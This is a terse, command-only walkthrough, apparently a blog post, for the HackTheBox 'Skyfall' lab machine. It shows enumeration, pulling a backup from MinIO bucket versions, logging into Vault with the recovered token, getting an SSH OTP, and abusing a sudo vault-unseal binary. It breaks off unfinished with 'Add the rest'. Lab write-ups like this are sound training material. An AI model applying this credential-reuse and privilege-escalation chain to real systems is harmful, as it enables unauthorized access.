# Skyfall HacktheBox Writeup - Seasonal Machine (Insane)

https://cyberw1ng.medium.com

Adding Host: 

`IP skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb prd23-vault-internal.skyfall.htb" | sudo tee -a /etc/hosts`

Nmap:

`nmap -sC -sV IP`

Dir Enum:

`gobuster dir -u http://skyfall.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

DNS Enum: 

`gobuster dns -d skyfall.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20`


Installing Minio Client

```
curl https://dl.min.io/client/mc/release/linux-amd64/mc \
  --create-dirs \
  -o $HOME/minio-binaries/mc

chmod +x $HOME/minio-binaries/mc
export PATH=$PATH:$HOME/minio-binaries/
```

```
mc alias set myminio http://prd23-s3-backend.skyfall.htb ACCESS_KEY SECRET_KEY
mc ls - recursive - versions myminio
mc cp - vid 2b75346d-2a47–4203-ab09–3c9f878466b8 myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
tar -xzvf home_backup.tar.gz
cat .bashrc
wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip
unzip vault_1.15.5_linux_amd64.zip
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
./vault login
./vault token capabilities ssh/roles
./vault list ssh/roles
./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@HTB_IP
sudo -l
rm -rf debug.log 
touch debug.log
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
exit
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
./vault login
./vault ssh -role dev_otp_key_role -.......Add the rest

```
